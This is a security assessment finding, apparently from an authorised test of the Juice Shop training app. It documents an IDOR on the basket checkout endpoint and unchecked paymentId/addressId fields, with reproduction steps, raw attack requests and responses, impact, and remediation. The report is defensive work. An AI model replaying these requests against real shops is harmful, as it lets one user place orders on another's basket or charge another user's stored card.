# Finding F-005: Insecure Direct Object Reference (IDOR) on Basket Checkout — Unauthorized Checkout of Another User's Basket

| Field | Value |
|---|---|
| Finding ID | F-005 |
| Title | IDOR on `POST /rest/basket/:id/checkout` Allows Any User to Check Out Another User's Basket |
| Category | OWASP Top 10 — A01:2021 Broken Access Control |
| Severity | **Critical** |
| Status | Confirmed |
| Affected Component | `POST /rest/basket/:id/checkout` |
| Date Identified | 2026-09-29 |

## Summary

The checkout endpoint takes a basket ID directly from the URL path and does not
verify that the basket belongs to the authenticated user making the request. Any
logged-in user can trigger checkout on **any other user's basket** simply by
changing the numeric ID in the URL — using their own, completely valid,
unmodified session token. No token forgery, signature bypass, or privilege
escalation is required; this is a plain, unauthenticated-by-design object
reference flaw, distinct from and independent of F-002 (JWT signature bypass).

This is more severe than a typical read-only IDOR because it triggers a **real,
state-changing financial transaction** — an order confirmation is generated
against the victim's basket, not just data disclosure.

Follow-up testing (see Sub-Finding below) confirmed the same missing-ownership
pattern also applies to the `paymentId` and `addressId` fields inside the
checkout request body, not just the basket ID in the URL — meaning an attacker
can attach a **different user's saved payment card and delivery address** to
their own order, independent of the basket-ownership bug documented in the main
finding.

## Steps to Reproduce

1. Log in as **User A** (`test@gmail.com`, `id: 25`) and log in as **User B**
   (`testuser-b@example.local`, `id: 27`) in separate sessions.
2. As User B, add several real products to their own basket (basket `id: 8`) via
   the normal UI. Confirm via `GET /rest/basket/8` (using B's own token) that the
   basket is genuinely populated.
3. As User A, capture a normal, legitimate checkout request against **A's own**
   basket (`POST /rest/basket/6/checkout`) to establish a baseline. Confirm it
   succeeds with `200 OK` and an order confirmation.
4. Replay the **same request**, changing only the basket ID in the URL from `6`
   to `8` (User B's basket) — Authorization header, Cookie, and body all remain
   User A's own, unmodified, legitimately-issued session.
5. Observe: `200 OK`, with a **new, distinct order confirmation**, generated
   against User B's basket and its contents.

## Evidence

**Baseline — User A checking out their own basket (`bid: 6`, matches A's token):**
```
POST /rest/basket/6/checkout
Authorization: Bearer <User A token, decoded: "id":25, "bid":6>

{"couponData":"bnVsbA==","orderDetails":{"paymentId":"7","addressId":"7","deliveryMethodId":"1"}}

HTTP/1.1 200 OK
{"orderConfirmation":"1aed-187b07d984b6382b"}
```

**Victim basket confirmed populated (User B's own session, `GET /rest/basket/8`):**
```
HTTP/1.1 200 OK
{"status":"success","data":{"id":8,"UserId":27,"Products":[
  {"id":1,"name":"Apple Juice (1000ml)","price":1.99,...},
  {"id":6,"name":"Banana Juice (1000ml)","price":1.99,...},
  {"id":52,"name":"Basil Smoothie","price":2.99,...},
  {"id":51,"name":"Berry Juice (1000ml)","price":3.49,...},
  {"id":42,"name":"Best Juice Shop Salesman Artwork","price":5000,...},
  {"id":3,"name":"Eggfruit Juice (500ml)","price":8.99,...},
  {"id":50,"name":"Dragonfruit Juice (500ml)","price":3.99,...},
  {"id":54,"name":"Elderflower Cordial (500ml)","price":3.29,...}
]}}
```
Basket total at time of attack: approximately **$5,025.63** (dominated by the
$5000 artwork item), confirming this basket held real, non-trivial value.

**Attack — User A's own token, targeting User B's basket ID (`8`):**
```
POST /rest/basket/8/checkout
Authorization: Bearer <User A token, decoded: "id":25, "bid":6 — unchanged from baseline>

{"couponData":"bnVsbA==","orderDetails":{"paymentId":"7","addressId":"7","deliveryMethodId":"1"}}

HTTP/1.1 200 OK
{"orderConfirmation":"1aed-de5438bbb0e06b72"}
```

Note the order confirmation (`1aed-de5438bbb0e06b72`) is distinct from both A's
own legitimate order (`1aed-187b07d984b6382b`) and B's own legitimate order
placed separately (`57f7-c199a14ba8fe58c3`) — confirming this was a third,
independently-triggered transaction against B's basket, initiated entirely by A.

Full raw requests/responses saved in
`evidence/requests-responses/F-005-idor-checkout.txt`.

*(Sanitization note: truncate/redact both users' JWT signature segments before
committing, per project standard — see `scope-and-authorization.md` Section 8.)*

## Sub-Finding: `paymentId` / `addressId` Not Validated as Belonging to the Requester

This directly resolves the open question flagged in this finding's own original
Follow-Up Testing section: whether `paymentId` and `addressId` supplied in the
checkout body are verified as belonging to the authenticated user, independent
of the basket-ownership issue documented above.

**Setup:** two separate accounts were used —
- **Account 1**: `id: 25`, `test@gmail.com`, own basket `bid: 6`
- **Account 2**: `id: 26`, `testuser-a@example.local`, with a saved card and
  address created specifically for this test

**Step 1 — confirm Account 2's card and address IDs, using Account 2's own token:**
```
GET /api/Cards
Authorization: Bearer <Account 2 token>

HTTP/1.1 200 OK
{"status":"success","data":[{"UserId":26,"id":7,"fullName":"testuser-a","cardNum":"************3456","expMonth":1,"expYear":2081}]}
```
```
GET /api/Addresss
Authorization: Bearer <Account 2 token>

HTTP/1.1 200 OK
{"status":"success","data":[{"UserId":26,"id":8,"fullName":"test", ...}]}
```
Both records are confirmed, via the response body's own `UserId` field, to
belong to Account 2 (`id: 26`) — not Account 1.

**Step 2 — Account 1 adds an item to their own basket, then checks out using
Account 2's card ID (`7`) and address ID (`8`):**
```
POST /api/BasketItems/
Authorization: Bearer <Account 1 token>

{"ProductId":1,"BasketId":6,"quantity":1}

HTTP/1.1 200 OK
{"status":"success","data":{"id":9,"ProductId":1,"BasketId":6,"quantity":1,...}}
```
```
POST /rest/basket/6/checkout
Authorization: Bearer <Account 1 token, own basket, id:25>

{"couponData":"bnVsbA==","orderDetails":{"paymentId":"7","addressId":"8","deliveryMethodId":"1"}}

HTTP/1.1 200 OK
{"orderConfirmation":"1aed-18b1f1f329bf8830"}
```

**Result:** Account 1 successfully completed checkout on their **own basket**
using a payment card and delivery address that independently verified as
belonging to **Account 2**. No error, no ownership check, no rejection — a
distinct order confirmation was issued.

**Verification status:** confirmed via one clean, fully-evidenced test run
(IDs independently verified via a separate `GET` request before use, not
assumed). Per this project's verification standard, a second run — e.g.
reversing direction, Account 2 checking out using Account 1's saved card/address
— is recommended before treating this as fully bulletproof for the final report,
though the result obtained is unambiguous on its own.

## Impact

- Any authenticated user (no special privilege required) can force checkout of
  **any other user's basket** simply by iterating basket IDs in the URL — no
  password, token theft, or signature bypass needed.
- Unlike F-002/F-003 (which expose or forge identity), this flaw abuses the
  **victim's own legitimate basket and payment/delivery context** — meaning in
  a production system, the attacker triggers a transaction that could result in
  the victim being charged, or the attacker fraudulently receiving goods
  ostensibly ordered against another account's basket, depending on how
  payment/fulfillment is wired downstream of this endpoint.
- Combined with the sequential, low-value basket IDs observed during recon
  (`attack-surface-map.md` Section 3 — IDs `0`, `6`, `7`, `8`, `NaN` all seen in
  traffic), an attacker could trivially enumerate and target active baskets at
  scale, not just one guessed ID.
- **Confirmed (see Sub-Finding above):** `paymentId` and `addressId` in the
  checkout body are independently exploitable — an attacker can attach any
  other user's saved payment card or delivery address to their **own** order,
  entirely separate from the basket-ownership bug. Since card/address IDs are
  also small, sequential integers (observed values: `7`, `8`), this is
  realistically enumerable at the same scale as the basket-ID issue itself.
  In a production system this is a direct path to using another user's stored
  payment method without their knowledge or consent.

## Root Cause

The checkout route handler resolves the basket to operate on directly from the
`:id` URL parameter without cross-checking it against the authenticated user's
own basket ID (`bid` claim or an equivalent server-side lookup). The same
handler also reads `paymentId` and `addressId` directly from the client-supplied
request body and passes them through to order creation without any query
verifying those records belong to the authenticated user (`UserId` match).
This is the same underlying class of bug as **F-004** (review editing IDOR) —
an identifier taken from the request is trusted without an ownership check —
but manifests here on a state-changing, financially consequential endpoint
rather than a content-edit endpoint, and now confirmed on three separate
identifiers within the same request (basket ID, payment ID, address ID).

## Remediation

1. On every request to `/rest/basket/:id/*` (including `/checkout`), verify
   server-side that `:id` matches the basket ID associated with the
   authenticated session (`bid` claim or an equivalent server-side lookup) —
   reject with `403` if it does not match.
2. **Confirmed necessary (see Sub-Finding):** verify server-side that the
   `paymentId` and `addressId` supplied in the checkout body belong to the
   authenticated user (`UserId` match on both records) before allowing checkout
   to proceed — reject with `403` if either does not match.
3. Apply the same object-ownership check pattern across all other `:id`-based
   endpoints identified in `attack-surface-map.md` Section 8 (basket read,
   order tracking) — this is very likely a systemic pattern, not an isolated
   bug in this one route.
4. Add automated regression tests asserting that User A cannot successfully
   act (read or write) on any resource ID belonging to User B, covering basket
   ID, payment ID, and address ID as three independent test cases.

## Related Findings

- **F-004** (Broken Access Control — Forged/Unauthorized Review Edit) — same
  root-cause pattern (missing ownership check on a client-supplied ID), different
  endpoint and impact tier.
- **F-002** (JWT Signature Bypass) — independent of this finding; this bug
  requires no token forgery at all, meaning fixing F-002 alone would **not**
  remediate this issue.
- **F-012** (Missing RBAC on REST-Scaffolded Endpoints) — same broad theme
  across the assessment: object identifiers supplied by the client are
  frequently trusted without a server-side ownership or role check.

## Follow-Up Testing (planned)

- [x] Test whether `paymentId` / `addressId` in the checkout body are validated
      as belonging to the requester, independent of the basket-ownership issue.
      **Confirmed not validated — see Sub-Finding above.** Recommended: a second
      confirmatory run in the reverse direction before final report sign-off.
- [ ] Sweep remaining Section 8 priority items with the same rigor: basket
      *read* IDOR (`GET /rest/basket/:id`) and order-tracking code enumeration.
- [ ] Test price/quantity tampering within the checkout body itself (Step 9,
      business logic).

## References

- OWASP Top 10 2021 — A01: Broken Access Control
- CWE-639: Authorization Bypass Through User-Controlled Key
